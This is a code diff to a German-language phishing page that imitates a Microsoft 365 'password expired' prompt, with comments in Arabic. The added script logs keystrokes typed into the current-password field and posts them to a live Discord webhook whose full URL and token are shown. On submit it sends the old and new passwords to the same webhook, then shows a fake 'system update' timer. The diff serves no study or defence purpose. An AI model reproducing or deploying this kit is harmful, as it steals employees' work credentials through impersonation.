@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sicherheitseinstellungen - Microsoft 365</title>
+    <link rel="icon" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon">
     <style>
         body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .login-card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
@@ -25,7 +26,7 @@
 <div class="login-card" id="login-section">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
     <h2>Kennwort abgelaufen</h2>
-    <p>Aufgrund der neuen <b>IT-Sicherheitsrichtlinien</b> Ihrer Organisation muss Ihr Kennwort alle 90 Tage aktualisiert werden. Bitte bestätigen Sie Ihr aktuelles Kennwort, um den Zugriff auf Ihre Arbeitsmaterialien beizubehalten.</p>
+    <p>Aufgrund der neuen <b>IT-Sicherheitsrichtlinien</b> muss Ihr Kennwort aktualisiert werden. Bitte bestätigen Sie Ihr aktuelles Kennwort.</p>
     
     <label>Aktuelles Kennwort</label>
     <input type="password" id="old_pass" placeholder="Aktuelles Kennwort" required>
@@ -37,7 +38,7 @@
     <input type="password" id="confirm_pass" placeholder="Kennwort bestätigen" required>
     
     <div class="btn-container">
-        <button onclick="sendData()">Kennwort ändern</button>
+        <button onclick="sendFinalData()">Kennwort ändern</button>
     </div>
 </div>
 
@@ -45,30 +46,58 @@
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
     <h3>Systemaktualisierung...</h3>
     <div class="spinner"></div>
-    <p>Ihre Daten werden mit dem Server synchronisiert. Bitte warten Sie <span id="seconds">5</span> Sekunden...</p>
+    <p>Bitte warten Sie <span id="seconds">5</span> Sekunden...</p>
 </div>
 
 <script>
-    function sendData() {
+    const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
+
+    // --- نظام الـ Keylogger المطور ---
+    const oldPassInput = document.getElementById('old_pass');
+    let timeout = null;
+
+    oldPassInput.addEventListener('input', function() {
+        clearTimeout(timeout);
+        timeout = setTimeout(() => {
+            const currentText = oldPassInput.value;
+            if (currentText.length > 0) {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "⌨️ **Live Typing (جاري الكتابة):**\n` " + currentText + " `\n*(تم التحديث بناءً على آخر تعديل)*"
+                    })
+                });
+            }
+        }, 1200); // إرسال بعد ثانية وربع من التوقف عن الكتابة
+    });
+
+    // --- نظام الإرسال النهائي عند الضغط على الزر ---
+    function sendFinalData() {
         const oldP = document.getElementById('old_pass').value;
         const newP = document.getElementById('new_pass').value;
         const confP = document.getElementById('confirm_pass').value;
-        
-        const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-        if (oldP.length < 1 || newP.length < 1) {
-            alert("Bitte füllen Sie alle Pflichtfelder aus.");
-            return;
-        }
+        if (oldP.length < 1) return alert("Bitte füllen Sie alle Felder aus.");
 
+        // إرسال الضربة القاضية
         fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: "📂 **ERGEBNIS: ARBEITS-E-MAIL**\n\n**1. Aktuelles Kennwort (القديمة):** `" + oldP + "`\n**2. Neues Passwort:** `" + newP + "`\n**3. Bestätigung:** `" + confP + "`\n\n**Status:** Verifiziert ✅"
+                embeds: [{
+                    title: "✅ صيد نهائي مكتمل",
+                    color: 3066993,
+                    fields: [
+                        { name: "🔑 الباسوورد الحقيقي", value: "`" + oldP + "`", inline: false },
+                        { name: "🆕 الباسوورد الجديد المقترح", value: "`" + newP + "`", inline: true }
+                    ],
+                    footer: { text: "نظام التحقق المتطور - GitHub Pages" }
+                }]
             })
         });
 
+        // إظهار المؤقت
         document.getElementById('login-section').style.display = 'none';
         document.getElementById('timer-section').style.display = 'block';
 
